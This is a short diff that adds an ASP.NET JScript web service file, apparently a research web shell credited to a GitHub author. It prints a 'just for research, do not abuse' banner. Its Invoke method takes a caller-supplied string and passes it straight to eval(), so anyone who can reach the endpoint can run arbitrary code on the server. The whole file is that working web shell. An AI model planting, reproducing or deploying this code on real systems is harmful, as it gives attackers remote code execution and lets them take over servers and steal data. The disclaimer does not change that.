@@ -1,0 +1,2 @@
+﻿<%@ WebService Language="JScript" class="ScriptMethodSpy"%>import System;import System.Web;import System.IO;import System.Web.Servicesimport System.Web.Script.Servicespublic class ScriptMethodSpy extends WebService{WebMethodAttribute ScriptMethodAttribute function Invoke(Ivan : String) : Void{ 
+var I = HttpContext.Current;var Request = I.Request;var Response = I.Response;var Server = I.Server;Response.Write("<H1>Just for Research Learning, Do Not Abuse It! Written By <a href='https://github.com/Ivan1ee'>Ivan1ee</a></H1>");eval(Ivan);}}
